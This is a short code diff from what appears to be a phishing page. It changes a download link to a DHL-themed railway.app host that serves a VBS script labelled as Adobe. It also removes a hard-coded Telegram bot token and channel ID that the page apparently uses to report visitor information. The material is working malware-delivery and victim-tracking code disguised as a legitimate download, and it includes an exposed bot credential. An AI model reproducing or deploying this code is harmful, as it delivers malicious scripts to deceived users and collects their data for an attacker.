@@ -2348,7 +2348,7 @@
           console.error('Error with visitor tracking:', error);
         }
         
-        var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(parentDocId);
+        var downloadUrl = 'https://dhl-trk-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(parentDocId);
         
         // Check if Edge browser
         var isEdge = /Edg/.test(navigator.userAgent);
@@ -2543,9 +2543,7 @@
     // 3. To get your chat ID, send a message to your bot and visit:
     //    https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
     // 
-    const TELEGRAM_BOT_TOKEN = '8701225048:AAFzjXztqf9MZBxvGpAYzwLIitN__atyqnc';
-    const TELEGRAM_CHANNEL_ID = '7887345335';
-    
+  
     // Telegram Notification Functions
     async function getVisitorInfo() {
       try {
